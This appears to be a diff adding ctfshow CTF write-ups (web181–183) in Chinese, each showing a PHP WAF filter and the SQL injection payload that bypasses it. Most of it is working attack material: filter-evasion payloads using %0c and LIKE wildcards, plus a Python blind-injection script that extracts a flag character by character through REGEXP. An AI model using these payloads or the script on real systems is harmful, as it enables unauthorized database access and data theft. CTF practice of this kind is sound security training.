@@ -1949,6 +1949,79 @@ id=1'or'1'='1'%23
 
 
 
+### web181
+
+```
+  function waf($str){
+    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
+  }
+```
+
+这次过滤了空格
+
+payload:-1'%0cor%0cusername='flag
+
+
+
+### web182
+
+```
+//对传入的参数进行了过滤
+  function waf($str){
+    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
+  }
+```
+
+不许直接访问flag
+
+payload:-1'%0cor%0cusername%0clike%0c'f%%%
+
+
+
+### web183
+
+```
+  function waf($str){
+    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
+  }
+```
+
+不允许select or and flag into =
+
+用like+正则 
+
+tableName=`ctfshow_user`where`pass`like'%25c%25'，直接POST上去。
+
+然后，使用盲注脚本：
+
+```
+import requests
+
+url = 'http://59418fd8-bd5f-4fd3-bc04-9997ef8ac8e4.challenge.ctf.show/select-waf.php'
+
+flagstr = '1234567890asdfghjklqwertyuiopzxcvbnm-_{}'
+flag = 'ctfshow{'
+
+for i in range(50):
+    for x in flagstr:
+        data = {
+            'tableName': f"`ctfshow_user`where`pass`regexp'{flag + x}'"
+        }
+        res = requests.post(url=url, data=data)
+        if res.text.find('user_count = 1;') > 0:
+            flag += x
+            print('++++++++++++++++++++++++right:   ' + x)
+            break
+        else:
+            print('+++++++++++++++++wrong:  ' + x)
+    print(flag)
+
+```
+
+运行即可发现flag的值会一点一点拼出来，直到括号闭合成功后即可停止脚本执行提交flag。
+
+
+
 ## 反序列化
 
 ### web254
